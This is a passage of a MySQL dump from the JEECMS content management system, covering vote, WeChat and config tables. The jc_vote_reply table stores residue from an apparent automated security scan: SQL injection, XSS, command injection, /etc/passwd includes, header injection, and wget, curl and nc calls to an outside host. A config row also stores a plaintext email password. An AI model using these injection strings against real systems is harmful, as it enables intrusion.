16:01:00','117.41.152.66','5b4e56ce66ea43e38640f1c3434d683e',NULL),(44,NULL,10,'2016-10-10 16:01:00','117.41.152.66','f1502ea8feed44c9981428fba35e9aff',NULL),(45,NULL,10,'2016-10-10 16:01:00','117.41.152.66','fb3dfceba790475fb563904b553fec91',NULL),(46,NULL,10,'2016-10-10 16:01:00','117.41.152.66','eef4c07438f94622a2922ec015971c42',NULL),(47,NULL,10,'2016-10-10 16:01:00','117.41.152.66','be507e426c2e4fdcb4e4dbcac6f925aa',NULL),(48,NULL,10,'2016-10-10 16:01:00','117.41.152.66','a32b9c09af56456d8eadbc91c0e36632',NULL),(50,NULL,10,'2016-10-10 16:01:01','117.41.152.66','d5c2cc42603c41e3968576b736118b62',NULL),(51,NULL,10,'2016-10-10 16:01:01','117.41.152.66','fd79161c7c22486981d3ba0bcceb1500',NULL),(53,NULL,10,'2016-10-10 16:01:01','117.41.152.66','9281df23008c40708f0a8e43341ac4ae',NULL),(54,NULL,10,'2016-10-10 16:01:02','117.41.152.66','857782badf554f7fb1a3cd42ff1be708',NULL),(55,NULL,10,'2016-10-10 16:01:02','117.41.152.66','6dfc50c459a34d669aed64847f7c6733',NULL),(56,NULL,10,'2016-10-10 16:01:06','117.41.152.66','7163edffccd8453888abce6f95d7cfdd',NULL),(57,NULL,10,'2016-10-10 16:01:06','117.41.152.66','472e57a5836f42d09c3afbb23552e4e3',NULL),(58,NULL,10,'2016-10-10 16:01:07','117.41.152.66','17ebcb43eaba48f087c700d367b41692',NULL),(59,NULL,10,'2016-10-10 16:01:07','117.41.152.66','727bdde2e94d4077b081959f4ca9a946',NULL),(60,NULL,10,'2016-10-10 16:01:07','117.41.152.66','16d626ece9bd41aeb1300be3b9ea3ee0',NULL),(61,NULL,10,'2016-10-10 16:01:08','117.41.152.66','8993e9dd5af34d3faf8dbcbf5c6494d6',NULL),(62,NULL,10,'2016-10-10 16:01:08','117.41.152.66','bfda82a4d10f4d1b8d4e32e55200d07e',NULL),(63,NULL,10,'2016-10-10 16:01:09','117.41.152.66','76ecfcc002b54d568a5f0d4f1ca20700',NULL),(64,NULL,10,'2016-10-10 16:01:09','117.41.152.66','1ff84eab46d442daae3673ad2e831a54',NULL),(65,NULL,10,'2016-10-10 16:01:10','117.41.152.66','0f39c2a605bf49c0a376879cd557ce01',NULL),(66,NULL,10,'2016-10-10 16:01:10','117.41.152.66','cb44988a08b34af1bff99c1cb63b8b2d',NULL),(67,NULL,10,'2016-10-10 16:01:11','117.41.152.66','4ba0635f7de14fe1b3a10de57d5783d4',NULL),(68,NULL,10,'2016-10-10 16:01:11','117.41.152.66','0711f2524cf4451d954c6f94c4bf5099',NULL),(69,NULL,10,'2016-10-10 16:01:12','117.41.152.66','5865796b06ee43af8f727c8f8f57ff94',NULL),(70,NULL,10,'2016-10-10 16:01:12','117.41.152.66','ba8fa930a89d499ab4fbe4e0d565be10',NULL),(71,NULL,10,'2016-10-10 16:01:13','117.41.152.66','e68f2e1dc3f94724bdc91b29bd3846bc',NULL),(72,NULL,10,'2016-10-10 16:01:13','117.41.152.66','e574898d0d3f4313b2dd7e607e432d44',NULL),(73,NULL,10,'2016-10-10 16:01:14','117.41.152.66','8c6f9de0ee764264bf0c3b105ccf4825',NULL),(74,NULL,10,'2016-10-10 16:01:14','117.41.152.66','d73fc39a867d46459c5bb5d5b353933f',NULL),(75,NULL,10,'2016-10-10 16:01:15','117.41.152.66','00fd7c694c2f4d18951b9feda39fec5d',NULL),(76,NULL,11,'2016-10-10 16:01:39','117.41.152.66','869e55ac9e1548c7b95956d1083e7a83',NULL),(77,NULL,10,'2016-10-10 16:01:40','117.41.152.66','5c9efcf72f784ec2948c34c660e11d26',NULL),(78,NULL,11,'2016-10-10 16:01:41','117.41.152.66','222ebfd7010f4c69b971bbb388d2e3d0',NULL),(79,NULL,11,'2016-10-10 16:01:42','117.41.152.66','0a9d43bc940f4b0786e981aa09ac3a67',NULL),(80,NULL,10,'2016-10-10 16:01:43','117.41.152.66','160ba1860a52472bbfa17230f5cd1d99',NULL);
/*!40000 ALTER TABLE `jc_vote_record` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_vote_reply`
--

DROP TABLE IF EXISTS `jc_vote_reply`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_vote_reply` (
  `votereply_id` int(11) NOT NULL AUTO_INCREMENT,
  `reply` text COMMENT '回复内容',
  `subtopic_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`votereply_id`),
  KEY `FK_jc_vote_reply_sub` (`subtopic_id`),
  CONSTRAINT `FK_jc_vote_reply_sub` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=151 DEFAULT CHARSET=utf8 COMMENT='投票文本题目回复表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_vote_reply`
--

LOCK TABLES `jc_vote_reply` WRITE;
/*!40000 ALTER TABLE `jc_vote_reply` DISABLE KEYS */;
INSERT INTO `jc_vote_reply` VALUES (1,'111',14),(2,'111',14),(3,'111',14),(4,'111',14),(5,'111',14),(6,'111',14),(7,'111',14),(8,'111',14),(9,'1234',14),(10,'1234',14),(11,'1234',14),(12,'1234',14),(13,'1234',14),(14,'1234',14),(15,'1234',14),(16,'1234',14),(17,'1234',14),(18,'1234',14),(19,'1234',14),(20,'1234',14),(21,'1234',14),(22,'1234',14),(23,'1234',14),(24,'1234',14),(25,'1234',14),(26,'1234',14),(27,'1234',14),(28,'1234',14),(29,'1234',14),(30,'1234',14),(31,'1234',14),(32,'1234',14),(33,'1234',14),(34,'1234',14),(35,'1234',14),(36,'1234',14),(37,'1234WFXSSProbe',14),(38,'WF&＃39;SQL\"Probe;A--B',14),(39,'1234&＃39;\"',14),(40,'ProbePhishing',14),(41,'A1234B',14),(42,'1234WFXSSProbe&＃39;\"&＃41;/&gt;',14),(43,'1234',14),(44,'1234',14),(45,'99999999999999999999',14),(46,'1234＃&&lt;&＃40;, \"&gt;;',14),(47,'1234',14),(48,'-99999999999999999999',14),(49,'|id',14),(50,'|ls -a1F',14),(51,'1234',14),(52,'1234',14),(53,'&&id',14),(54,'4294967297',14),(55,'ls',14),(56,'&&ls -a1F',14),(57,'18446744073709551617',14),(58,'1234',14),(59,'||id',14),(60,'||ls -a1F',14),(61,'\0',14),(62,'&＃39; | &＃39;id',14),(63,'&＃39; | &＃39;ls -a1F',14),(64,'1234',14),(65,'\" | \"id',14),(66,'|vol',14),(67,'1234',14),(68,'\" | \"ls -a1F',14),(69,'1234',14),(70,'id',14),(71,'&&vol',14),(72,'1234',14),(73,'id|',14),(74,'ls -a1F',14),(75,';id\0',14),(76,'1234\"|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1269|echo \"',14),(77,'||vol',14),(78,'1234',14),(79,'../../../../../../../../../../../../bin/id|',14),(80,';ls -a1F\0',14),(81,'1234',14),(82,'&＃39; | &＃39;vol',14),(83,'1234&＃39;|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1275|echo &＃39;',14),(84,'../../../../../../../../../../../../usr/bin/id|',14),(85,'0 0 0 1234',14),(86,'1234',14),(87,'\" | \"vol',14),(88,'1234|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1276|echo ;',14),(89,'1234&＃39; and &＃39;f&＃39;=&＃39;f',14),(90,';vol\0',14),(91,'1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39; -- ',14),(92,'1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39;&＃41; -- ',14),(93,'1234&＃39; and &＃39;b&＃39;=&＃39;f',14),(94,'1234\"|echo -e \"GET /AppScanMsg.html?varId=1280 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo \"',14),(95,'1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39; -- ',14),(96,'1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39;&＃41; --',14),(97,'1234&＃39; or &＃39;f&＃39;=&＃39;f',14),(98,'1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39; -- ',14),(99,'1234&＃39;|echo -e \"GET /AppScanMsg.html?varId=1288 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo &＃39;',14),(100,'1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39;&＃41; --',14),(101,'&lt;!--＃include file=\"/etc/passwd\"--&gt;',14),(102,'1234',14),(103,'&lt;!--＃include file=\"C:\\boot.ini\"--&gt;',14),(104,'1234|echo -e \"GET /AppScanMsg.html?varId=1289 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo ',14),(105,'1234',14),(106,'1234 and 7659=7659',14),(107,';vol|',14),(108,'1234',14),(109,'1234;curl http://192.168.0.2:51167/AppScanMsg.html?varId=1290;',14),(110,'1234 and 0=7659',14),(111,'1234/**/and/**/7659=7659',14),(112,'&＃39;   ltrim&＃40;&＃39;&＃39;&＃41;   &＃39;1234',14),(113,'1234',14),(114,'1234 or 7659=7659',14),(115,'&＃39;   &＃39;   &＃39;1234',14),(116,'1234/**/and/**/0=7659',14),(117,'12345 12345 1234',14),(118,'1234',14),(119,'1234',14),(120,'1234&＃39;   &＃39;   &＃39;',14),(121,'1234/**/or/**/7659=7659',14),(122,'1234 and 7659=7659',14),(123,'12345-1234-1234',14),(124,'1234',14),(125,'&＃40;select 1234&＃41;',14),(126,'1234',14),(127,'&＃39; || &＃39;&＃39; || &＃39;1234',14),(128,'1234 and abc=7659',14),(129,'&＃40;select 1234,1234&＃41;',14),(130,'&＃39; || &＃39; || &＃39;1234',14),(131,'&＃39;',14),(132,'1234 or',14),(133,'1234&＃39; || &＃39; || &＃39;',14),(134,'&＃40;select 1234,',14),(135,'AVAK$&＃40;RETURN_CODE&＃41;OS',14),(136,'\\&＃39;',14),(137,';',14),(138,'1234',14),(139,'\"',14),(140,'1234',14),(141,'1234XYZ',14),(142,'\\\"',14),(143,'1234kqprobebg000043',14),(144,'1234\rAppScanHeader: AppScanValue/1.2-1350\rSecondAppScanHeader: whatever',14),(145,'&＃41;',14),(146,'kqprobebg000043',14),(147,'1234\r\nAppScanHeader: AppScanValue/1.2-1355\r\nSecondAppScanHeader: whatever',14),(148,'\"&＃39;',14),(149,'1234&＃39;Akqprobebg000043',14),(150,'1234\"Akqprobebg000043',14);
/*!40000 ALTER TABLE `jc_vote_reply` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_vote_subtopic`
--

DROP TABLE IF EXISTS `jc_vote_subtopic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_vote_subtopic` (
  `subtopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `votetopic_id` int(11) NOT NULL DEFAULT '0' COMMENT '投票（调查）',
  `subtopic_type` int(2) NOT NULL DEFAULT '1' COMMENT '类型（1单选，2多选，3文本）',
  `priority` int(11) DEFAULT NULL,
  PRIMARY KEY (`subtopic_id`),
  KEY `FK_jc_vote_subtopic_vote` (`votetopic_id`),
  CONSTRAINT `FK_jc_vote_subtopic_vote` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=28 DEFAULT CHARSET=utf8 COMMENT='投票子题目';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_vote_subtopic`
--

LOCK TABLES `jc_vote_subtopic` WRITE;
/*!40000 ALTER TABLE `jc_vote_subtopic` DISABLE KEYS */;
INSERT INTO `jc_vote_subtopic` VALUES (13,'V8版本演示站网页的设计风格您喜欢吗？',2,1,1),(14,'我觉得这里完善一下：',2,3,3),(15,'V8版本比V7版的设计风格有改进吗？',2,1,2),(16,'您觉得V8演示站哪些模块做的比较好',2,2,4),(18,'上海工资收入',3,1,1),(20,'你喜欢哪个',4,1,1),(21,'你支持哪个选手？',5,1,1),(22,'你支持哪个选手？',6,1,1),(23,'你支持哪个选手？',7,1,1),(24,'你支持哪个选手？',8,1,1),(25,'你支持哪个学校？',9,1,1),(26,'国庆长假结束,您尽兴了吗?',10,1,1),(27,'你对取消住房公积金怎么看？',11,1,1);
/*!40000 ALTER TABLE `jc_vote_subtopic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_vote_topic`
--

DROP TABLE IF EXISTS `jc_vote_topic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_vote_topic` (
  `votetopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `repeate_hour` int(11) DEFAULT NULL COMMENT '重复投票限制时间，单位小时，为空不允许重复投票',
  `total_count` int(11) NOT NULL DEFAULT '0' COMMENT '总投票数',
  `multi_select` int(11) NOT NULL DEFAULT '1' COMMENT '最多可以选择几项',
  `is_restrict_member` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制会员',
  `is_restrict_ip` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制IP',
  `is_restrict_cookie` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制COOKIE',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认主题',
  `limit_weixin` tinyint(1) DEFAULT '0' COMMENT '是否限制微信',
  `vote_day` int(11) DEFAULT '0' COMMENT '限定微信投票每个用户每日投票次数,为0时则投票期内限定投票一次',
  PRIMARY KEY (`votetopic_id`),
  KEY `fk_jc_votetopic_site` (`site_id`),
  CONSTRAINT `fk_jc_votetopic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='CMS投票主题';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_vote_topic`
--

LOCK TABLES `jc_vote_topic` WRITE;
/*!40000 ALTER TABLE `jc_vote_topic` DISABLE KEYS */;
INSERT INTO `jc_vote_topic` VALUES (2,1,'JEECMS演示站改版用户问卷调查','JEECMSv8版正式发布了，伴随着系统的完善，jeecms演示站的模板也一直在不断的改版，针对此次改版，jeecms美工团队特邀您参与“JEECMS演示站改版用户问卷调查”，希望大家能提出宝贵的意见，我们一定认真改进，谢谢大家的支持！',NULL,NULL,NULL,84,1,0,0,0,0,1,0,0),(3,1,'工资收入问卷调查','工资收入问卷调查','2016-09-30 14:51:49','2016-09-30 15:00:49',NULL,1,1,0,0,1,0,0,0,0),(4,1,'男神女神主持选拔大赛','男神女神主持选拔大赛开始了，美女帅哥云集，大家快来投票吧！',NULL,'2020-10-09 10:30:13',NULL,0,1,0,0,1,0,0,0,0),(5,1,'最美志愿者评选','',NULL,'2019-01-09 10:33:59',NULL,0,1,0,0,1,0,0,0,0),(6,1,'2015年度好声音评选','',NULL,'2016-12-31 10:35:16',NULL,0,1,0,0,1,0,0,0,0),(7,1,'“樱花女神”评选大赛 第一季','',NULL,'2017-10-18 10:36:42',NULL,0,1,0,0,1,0,0,0,0),(8,1,'微信拍照大奖赛优秀作品 投票 开始啦','',NULL,'2016-10-27 10:37:50',NULL,0,1,0,0,1,0,0,0,0),(9,1,'南昌“我的校园我的家 温馨校园”评选活动','',NULL,'2017-12-01 10:38:52',NULL,0,1,0,0,1,0,0,0,0),(10,1,'国庆长假结束,您尽兴了吗?','',NULL,'2017-10-10 10:40:41',NULL,37,1,0,0,1,0,0,0,0),(11,1,'专家建议取消住房公积金，这事儿你咋看？','',NULL,'2018-10-18 10:42:29',NULL,16,1,0,0,1,0,0,0,0);
/*!40000 ALTER TABLE `jc_vote_topic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_webservice`
--

DROP TABLE IF EXISTS `jc_webservice`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_webservice` (
  `service_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_address` varchar(255) NOT NULL DEFAULT '' COMMENT '接口地址',
  `target_namespace` varchar(255) DEFAULT NULL,
  `success_result` varchar(255) DEFAULT '' COMMENT '正确返回值',
  `service_type` varchar(50) DEFAULT NULL COMMENT '接口类型',
  `service_operate` varchar(50) DEFAULT NULL COMMENT '接口操作',
  PRIMARY KEY (`service_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_webservice`
--

LOCK TABLES `jc_webservice` WRITE;
/*!40000 ALTER TABLE `jc_webservice` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_webservice` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_webservice_auth`
--

DROP TABLE IF EXISTS `jc_webservice_auth`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_webservice_auth` (
  `auth_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL COMMENT '用户名',
  `password` varchar(50) NOT NULL COMMENT '密码',
  `system` varchar(100) NOT NULL COMMENT '系统',
  `is_enable` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  PRIMARY KEY (`auth_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='webservices认证表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_webservice_auth`
--

LOCK TABLES `jc_webservice_auth` WRITE;
/*!40000 ALTER TABLE `jc_webservice_auth` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_webservice_auth` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_webservice_call_record`
--

DROP TABLE IF EXISTS `jc_webservice_call_record`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_webservice_call_record` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_code` varchar(50) NOT NULL COMMENT '接口识别码',
  `auth_id` int(11) NOT NULL COMMENT '调用的认证',
  `record_time` datetime NOT NULL COMMENT '调用时间',
  PRIMARY KEY (`record_id`),
  KEY `fk_webservice_record_auth` (`auth_id`),
  CONSTRAINT `fk_webservice_record_auth` FOREIGN KEY (`auth_id`) REFERENCES `jc_webservice_auth` (`auth_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口调用记录';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_webservice_call_record`
--

LOCK TABLES `jc_webservice_call_record` WRITE;
/*!40000 ALTER TABLE `jc_webservice_call_record` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_webservice_call_record` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_webservice_param`
--

DROP TABLE IF EXISTS `jc_webservice_param`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_webservice_param` (
  `service_id` int(11) NOT NULL DEFAULT '0',
  `priority` int(11) NOT NULL DEFAULT '0' COMMENT '排列顺序',
  `param_name` varchar(100) NOT NULL DEFAULT '' COMMENT '参数名',
  `default_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  KEY `fk_param_webservice` (`service_id`),
  CONSTRAINT `fk_param_webservice` FOREIGN KEY (`service_id`) REFERENCES `jc_webservice` (`service_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口参数表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_webservice_param`
--

LOCK TABLES `jc_webservice_param` WRITE;
/*!40000 ALTER TABLE `jc_webservice_param` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_webservice_param` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jg_weixin`
--

DROP TABLE IF EXISTS `jg_weixin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jg_weixin` (
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wx_pic` varchar(255) DEFAULT NULL COMMENT '微信二维码',
  `wx_welcome` varchar(255) NOT NULL DEFAULT '' COMMENT '关注欢迎语'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jg_weixin`
--

LOCK TABLES `jg_weixin` WRITE;
/*!40000 ALTER TABLE `jg_weixin` DISABLE KEYS */;
INSERT INTO `jg_weixin` VALUES (1,'/u/cms/www/201510/08105041f9xd.jpg','江西金磊科技有限公司欢迎您!');
/*!40000 ALTER TABLE `jg_weixin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jg_weixinmenu`
--

DROP TABLE IF EXISTS `jg_weixinmenu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jg_weixinmenu` (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wm_name` varchar(255) DEFAULT NULL COMMENT '微信菜单名称',
  `wm_type` varchar(255) DEFAULT NULL COMMENT '微信菜单类别',
  `wm_url` varchar(255) DEFAULT NULL COMMENT '链接地址',
  `wm_key` varchar(255) DEFAULT NULL COMMENT '点击key',
  `wm_parent_id` int(11) DEFAULT NULL COMMENT '父节点',
  PRIMARY KEY (`wm_id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jg_weixinmenu`
--

LOCK TABLES `jg_weixinmenu` WRITE;
/*!40000 ALTER TABLE `jg_weixinmenu` DISABLE KEYS */;
INSERT INTO `jg_weixinmenu` VALUES (1,1,'找官方','view','http://demo.jeecms.com/html/news/','1',NULL),(2,1,'演示站','view','http://demo.jeecms.com/html/picture/','2',NULL),(3,1,'新闻资讯','view','http://demo.jeecms.com/html/veido/','3',NULL),(4,1,'论坛','view','http://bbs.jeecms.com','4',1),(5,1,'官网','view','http://www.jeecms.com/','5',1),(6,1,'JSPGOU','view','http://demo3.jeecms.com','6',2),(7,1,'JEEBBS','view','http://bbs.jeecms.com','7',2),(8,1,'图库','view','http://demo.jeecms.com/news/index.jhtml/pic/index.jhtml','8',3),(9,1,'新闻','click','','news',3),(10,1,'JEECMS','view','http://demo.jeecms.com/','',2),(11,1,'视频','view','http://demo.jeecms.com/veido/index.jhtml','',3),(12,1,'下载','view','http://demo.jeecms.com/download/index.jhtml','http://demo19.jeecms.com/download/index.jhtml',3),(13,1,'调查','view','http://demo.jeecms.com/survey.jhtml','http://demo19.jeecms.com/wldc/index.jhtml',3),(14,1,'JSPGOU店中店','view','http://dzd.jeecms.com/','http://dzd.jeecms.com/',2);
/*!40000 ALTER TABLE `jg_weixinmenu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jg_weixinmessage`
--

DROP TABLE IF EXISTS `jg_weixinmessage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jg_weixinmessage` (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wm_number` varchar(255) DEFAULT NULL COMMENT '序号',
  `wm_title` varchar(255) DEFAULT NULL COMMENT '标题',
  `wm_path` varchar(255) DEFAULT NULL COMMENT '图片地址',
  `wm_url` varchar(255) DEFAULT NULL COMMENT '链接地址',
  `wm_content` varchar(255) DEFAULT NULL COMMENT '内容',
  `is_welcome` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否欢迎页',
  `wm_msg_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息类型(0带图文链接 1内容加关键字提示 2仅有内容)',
  PRIMARY KEY (`wm_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jg_weixinmessage`
--

LOCK TABLES `jg_weixinmessage` WRITE;
/*!40000 ALTER TABLE `jg_weixinmessage` DISABLE KEYS */;
INSERT INTO `jg_weixinmessage` VALUES (1,1,NULL,'留言','/u/cms/www/201510/08172019lz4w.png','http://demo.jeecms.com/guestbook.jspx','金磊科技欢迎您!',1,0),(2,1,'news','新闻','/u/cms/www/201510/27142936gt6k.jpg','http://demo19.jeecms.com/news/index.jhtml','新闻',0,0);
/*!40000 ALTER TABLE `jg_weixinmessage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jo_authentication`
--

DROP TABLE IF EXISTS `jo_authentication`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jo_authentication` (
  `authentication_id` char(32) NOT NULL COMMENT '认证ID',
  `userid` int(11) NOT NULL COMMENT '用户ID',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '邮箱',
  `login_time` datetime NOT NULL COMMENT '登录时间',
  `login_ip` varchar(50) NOT NULL COMMENT '登录ip',
  `update_time` datetime NOT NULL COMMENT '更新时间',
  PRIMARY KEY (`authentication_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='认证信息表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jo_authentication`
--

LOCK TABLES `jo_authentication` WRITE;
/*!40000 ALTER TABLE `jo_authentication` DISABLE KEYS */;
/*!40000 ALTER TABLE `jo_authentication` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jo_config`
--

DROP TABLE IF EXISTS `jo_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jo_config` (
  `cfg_key` varchar(50) NOT NULL COMMENT '配置KEY',
  `cfg_value` varchar(255) DEFAULT NULL COMMENT '配置VALUE',
  PRIMARY KEY (`cfg_key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='配置表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jo_config`
--

LOCK TABLES `jo_config` WRITE;
/*!40000 ALTER TABLE `jo_config` DISABLE KEYS */;
INSERT INTO `jo_config` VALUES ('email_encoding',''),('email_host','smtp.qq.com'),('email_password','111111'),('email_personal',''),('email_port','25'),('email_username','228375211@qq.com'),('login_error_interval','30'),('login_error_times','3'),('message_forgotpassword_subject','找回JEECMS密码'),('message_forgotpassword_text','感谢您使用JEECMS系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://localhost:8080/jeecmsv7/member/password_reset.jspx?uid=${uid}&key=${resetKey}'),('message_register_subject','欢迎您注册JEECMS用户'),('message_register_text','${username}您好：\r\n欢迎您注册JEECMS系统会员\r\n请点击以下链接进行激活\r\nhttp://localhost:8080/jeecmsv7/active.jspx?username=${username}&key=${activationCode}'),('message_subject','JEECMS会员密码找回信息'),('message_text','感谢您使用JEECMS系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://localhost/member/password_reset.jspx?uid=${uid}&key=${resetKey}\r\n');
/*!40000 ALTER TABLE `jo_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jo_ftp`
--

DROP TABLE IF EXISTS `jo_ftp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jo_ftp` (
  `ftp_id` int(11) NOT NULL AUTO_INCREMENT,
  `ftp_name` varchar(100) NOT NULL COMMENT '名称',
  `ip` varchar(50) NOT NULL COMMENT 'IP',
  `port` int(11) NOT NULL DEFAULT '21' COMMENT '端口号',
  `username` varchar(100) DEFAULT NULL COMMENT '登录名',
  `password` varchar(100) DEFAULT NULL COMMENT '登陆密码',
  `encoding` varchar(20) NOT NULL DEFAULT 'UTF-8' COMMENT '编码',
  `timeout` int(11) DEFAULT NULL COMMENT '超时时间',
  `ftp_path` varchar(255) DEFAULT NULL COMMENT '路径',
  `url` varchar(255) NOT NULL COMMENT '访问URL',
  PRIMARY KEY (`ftp_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='FTP表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jo_ftp`
--

LOCK TABLES `jo_ftp` WRITE;
/*!40000 ALTER TABLE `jo_ftp` DISABLE KEYS */;
/*!40000 ALTER TABLE `jo_ftp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jo_template`
--

DROP TABLE IF EXISTS `jo_template`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jo_template` (
  `tpl_name` varchar(150) NOT NULL COMMENT '模板名称',
  `tpl_source` longtext COMMENT '模板内容',
